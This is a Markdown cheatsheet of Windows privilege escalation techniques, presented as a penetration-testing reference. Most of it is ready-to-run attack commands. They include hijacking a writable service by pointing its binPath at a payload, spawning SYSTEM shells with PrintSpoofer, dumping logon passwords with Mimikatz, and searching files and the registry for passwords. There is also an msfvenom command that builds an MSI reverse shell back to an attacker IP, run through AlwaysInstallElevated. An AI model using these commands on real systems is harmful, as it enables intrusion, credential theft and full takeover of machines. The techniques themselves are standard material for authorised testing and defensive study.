# Windows Privilege Escalation Cheatsheet 🚀

This cheatsheet provides a quick reference for common tools and commands used to identify and exploit privilege escalation vulnerabilities on Windows systems.

---

## ## 1. Initial Enumeration & Situational Awareness

All privilege escalation begins with understanding the system you are on. **Always start here.**

### ### Manual Enumeration Commands
* **Purpose:** To get a baseline understanding of the user, system, and network.
* **Commands:**
    ```powershell
    # Check current user, groups, and privileges
    whoami /all

    # Get OS version and patch level
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

    # List running processes and their owners
    tasklist /V

    # List configured services
    sc query

    # Check network configuration and listening ports
    netstat -ano
    ```

### ### Automated Enumeration Scripts
* **Purpose:** To automatically scan for a wide range of common misconfigurations and vulnerabilities.
* **Tools & Commands:**
    * **WinPEAS:**
        ```powershell
        # Execute the script and save the colorized output
        .\winPEASx64.exe -quiet -outputfile report.txt
        ```
    * **PowerUp.ps1:**
        ```powershell
        # Import the module and run all checks
        powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
        ```

---

## ## 2. Service Misconfigurations

This is one of the most common vectors for privilege escalation to **SYSTEM**.

### ### Unquoted Service Paths
* **Purpose:** Find services with paths that contain spaces and are not enclosed in quotes, allowing for hijacking.
* **Command (WMIC):**
    ```powershell
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
    ```

### ### Weak Service Permissions
* **Purpose:** Check if a low-privileged user can modify a service that runs with higher privileges.
* **Tools & Commands:**
    * **accesschk.exe (Sysinternals):** Checks permissions for the "Users" group on all services.
        ```powershell
        accesschk.exe /accepteula -uwcqv Users *
        ```
    * **sc.exe (built-in):** If a service is found to be modifiable, reconfigure its binary path to your payload and restart it.
        ```powershell
        # Reconfigure the service to point to your payload
        sc config <service_name> binPath= "C:\tmp\payload.exe"

        # Restart the service to trigger the payload
        sc stop <service_name>
        sc start <service_name>
        ```

---

## ## 3. Credential & Token Abuse

Leveraging stored credentials or abusing user privileges.

### ### Impersonation Privileges (SeImpersonate/SeAssignPrimaryToken)
* **Purpose:** Abuse powerful privileges, often held by service accounts, to impersonate the **SYSTEM** user.
* **Tools & Commands:**
    * **PrintSpoofer:** A reliable tool for exploiting this.
        ```powershell
        # Check for the privilege first
        whoami /priv

        # Use PrintSpoofer to spawn a command prompt as SYSTEM
        PrintSpoofer.exe -i -c cmd.exe
        ```
    * **Juicy Potato / Rotten Potato:** Older tools for the same purpose.

### ### Stored Credentials & Secrets
* **Purpose:** Find saved passwords or hashes in files, the registry, or credential manager.
* **Tools & Commands:**
    * **cmdkey:** Lists credentials saved in the Windows Vault.
        ```powershell
        cmdkey /list
        ```
    * **Mimikatz (Requires Admin):** Dumps credentials from memory.
        ```powershell
        # Get debug rights first
        privilege::debug

        # Dump credentials from the LSA process
        sekurlsa::logonpasswords
        ```
    * **Search for password files:**
        ```powershell
        dir /s /b *pass*.xml *pass*.txt *config* | findstr /i "password"
        reg query HKLM /f password /t REG_SZ /s
        ```

---

## ## 4. Registry Misconfigurations

### ### AlwaysInstallElevated
* **Purpose:** Checks for a policy that allows any user to install `.msi` packages with **SYSTEM** privileges.
* **Command (reg query):**
    ```powershell
    # Check if both registry keys are set to '1'
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ```
* **Exploitation:**
    ```bash
    # 1. Create a malicious MSI payload with msfvenom
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f msi -o malicious.msi

    # 2. Run the installer on the target machine (it will execute as SYSTEM)
    msiexec /quiet /qn /i C:\tmp\malicious.msi
    ```

---

## ## 5. File & Folder Permission Issues

### ### Insecure GUI Applications
* **Purpose:** If you have a low-privilege shell but can interact with a GUI application running as a higher user, you can use the "File -> Open" dialog to browse the file system and execute programs (like `cmd.exe`) with that user's privileges.

### ### Modifiable Scheduled Tasks
* **Purpose:** Find scheduled tasks that run as **SYSTEM** but execute a script or binary that is writable by your user.
* **Tools & Commands:**
    * **schtasks:** List all scheduled tasks and their details.
        ```powershell
        schtasks /query /fo LIST /v
        ```
    * **icacls:** Check the permissions on the target file executed by the task.
        ```powershell
        icacls "C:\Path\To\Task\Executable.exe"
        ```

---

## ## 6. Kernel Exploits

This should be a last resort, as kernel exploits can be unstable.

### ### Windows Exploit Suggester
* **Purpose:** Compares the target system's patch level (`systeminfo`) against a database of known kernel exploits.
* **Tools & Commands:**
    ```bash
    # 1. On the target, get system info
    systeminfo > systeminfo.txt

    # 2. On your attacker machine, run the tool
    python2 windows-exploit-suggester.py --database 2025-09-02-mssb.xls --systeminfo systeminfo.txt
    ```
